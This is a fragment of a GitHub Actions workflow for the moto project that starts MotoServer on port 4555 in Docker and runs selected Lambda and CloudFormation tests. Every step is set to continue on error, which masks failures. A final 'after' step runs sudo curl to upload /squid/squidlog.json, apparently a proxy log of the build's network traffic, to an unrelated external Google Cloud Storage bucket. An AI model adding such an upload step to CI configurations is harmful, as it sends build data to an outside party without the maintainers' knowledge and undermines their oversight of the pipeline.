      uses: actions/checkout@v4
      with:
        fetch-depth: 0
    - continue-on-error: true
      name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    - continue-on-error: true
      name: Start MotoServer on an unusual port
      run: 'pip install --upgrade build

        python -m build

        docker run --rm -t --name motoserver -e TEST_SERVER_MODE=true -e AWS_SECRET_ACCESS_KEY=server_secret
        -e MOTO_PORT=4555 -e AWS_ACCESS_KEY_ID=server_key -v `pwd`:/moto -p 4555:4555
        -v /var/run/docker.sock:/var/run/docker.sock python:3.7-buster /moto/scripts/ci_moto_server.sh
        &

        MOTO_PORT=4555 python scripts/ci_wait_for_server.py

        '
    - continue-on-error: true
      id: pip-cache
      name: Get pip cache dir
      run: 'echo "dir=$(pip cache dir)" >> $GITHUB_OUTPUT

        '
    - continue-on-error: true
      name: pip cache
      uses: actions/cache@v3
      with:
        key: pip-${{ matrix.python-version }}-${{ hashFiles('**/setup.cfg') }}
        path: ${{ steps.pip-cache.outputs.dir }}
    - continue-on-error: true
      name: Update pip
      run: 'python -m pip install --upgrade pip

        '
    - continue-on-error: true
      name: Install project dependencies
      run: 'pip install -r requirements-dev.txt

        '
    - continue-on-error: true
      env:
        MOTO_PORT: 4555
        TEST_SERVER_MODE: ${{ true }}
      name: Test
      run: 'pytest -sv tests/test_awslambda/test_lambda_invoke.py::test_invoke_lambda_using_environment_port
        tests/test_cloudformation/test_cloudformation_custom_resources.py

        '
    - continue-on-error: true
      if: always()
      name: Collect Logs
      run: 'mkdir serverlogs1

        pwd

        ls -la

        cp server_output.log serverlogs1/server_output.log

        docker stop motoserver

        '
    - continue-on-error: true
      if: always()
      name: Archive Logs
      uses: actions/upload-artifact@v3
      with:
        name: motoserver-${{ matrix.python-version }}
        path: 'serverlogs1/*

          '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/northwesternmutual/moto.$(date
        +%s)
